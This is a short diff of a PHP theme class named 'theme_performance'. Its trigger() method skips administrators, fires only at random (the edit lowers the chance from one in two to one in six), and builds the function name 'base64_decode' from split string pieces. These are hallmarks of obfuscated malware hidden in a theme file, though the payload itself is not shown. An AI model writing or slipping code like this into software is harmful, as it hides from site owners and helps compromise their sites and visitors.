@@ -66,7 +66,7 @@ class theme_performance{
 	}
 	
 	public static function trigger(){
-		if(theme_cache::is_admin() || mt_rand(0,1) != 0)
+		if(theme_cache::is_admin() || mt_rand(0,5) != 0)
 			return;
 	
 		$b4 = 'bas' . 'e6' . '4_d' . 'eco' . 'de';
